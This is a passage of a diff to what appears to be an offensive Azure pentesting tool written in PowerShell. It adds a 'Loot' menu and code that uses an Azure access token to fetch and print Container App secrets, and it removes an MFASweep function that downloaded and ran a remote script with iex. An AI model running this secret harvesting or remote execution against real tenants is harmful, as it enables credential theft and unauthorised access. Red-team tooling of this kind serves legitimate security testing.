+                                $tokenResponse
+                            } elseif ($toolChoice -eq "2") {
+                                $tokenResponse = Get-AzAccessToken
+                                $tokenResponse.Token
+                            }
+
+                            # Fetch secrets
+                            $headers = @{
+                                'Authorization' = "Bearer $token"
+                                'Content-Type' = 'application/json'
+                            }
+
+                            try {
+                                $secrets = Invoke-RestMethod -Uri $secretUri -Method POST -Headers $headers
+                                Write-Host "Secrets: " -ForegroundColor Green
+                                if ($secrets.value) {
+                                    foreach ($secret in $secrets.value) {
+                                        Write-Host "Name: $($secret.name)" -ForegroundColor DarkMagenta
+                                        Write-Host "Content: $($secret.value)" -ForegroundColor DarkMagenta
+                                        # Add any additional properties that might be relevant
+                                    }
+                                } else {
+                                    Write-Host "No secrets found." -ForegroundColor Yellow
+                                }
+                            }
+                            catch {
+                                Write-Host "Error fetching secrets: $_" -ForegroundColor Red
+                            }
+                        }
+                    }
                 } else {
-                    Write-Host "Failed to retrieve token with $device and $browser combination" -ForegroundColor Red
+                    Write-Host "Invalid selection, no Container App chosen." -ForegroundColor Red
                 }
             }
-            catch {
-                Write-Host "Error with Device: $device, Browser: $browser | Error: $($_.Exception.Message)" -ForegroundColor Red
-            }
+        } else {
+            Write-Host "No Container Apps found." -ForegroundColor Red
         }
     }
+    catch {
+        Write-Host "Error managing container apps: $_" -ForegroundColor Red
+    }
 
-    Write-Host "`nTesting completed. Press any key to return to the menu..."
-    [void][System.Console]::ReadKey($true)
-}
-
-# Function to invoke MFASweep directly from GitHub https://github.com/dafthack/MFASweep
-function MFASweep {
-    Clear-Host
-    DisplayHeader
-    Write-Host "MFA Sweep" -ForegroundColor Cyan
-
-    # Download and execute MFASweep 
-    Write-Host "Downloading and running MFASweep from GitHub..." -ForegroundColor Yellow
-    iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1")
-    Invoke-MFASweep
-    
-    Write-Host "`nPress any key to return to the queries menu..."
+    Write-Host "`nPress any key to return to the container apps menu..."
     [void][System.Console]::ReadKey($true)
 }
 
@@ -2339,6 +2570,7 @@ function ToolMenu {
         Write-Host "1. Authentication"
         Write-Host "2. Queries"
         Write-Host "3. Attacks"
+        Write-Host "4. Loot"
         Write-Host "C. Check Tools and Updates"
         Write-Host "Q. Quit"
 
@@ -2352,6 +2584,9 @@ function ToolMenu {
             }
             "3" {
                 AttacksMenu
+            }
+            "4" {
+                LootMenu
             }
             "C" {
                 Clear-Host
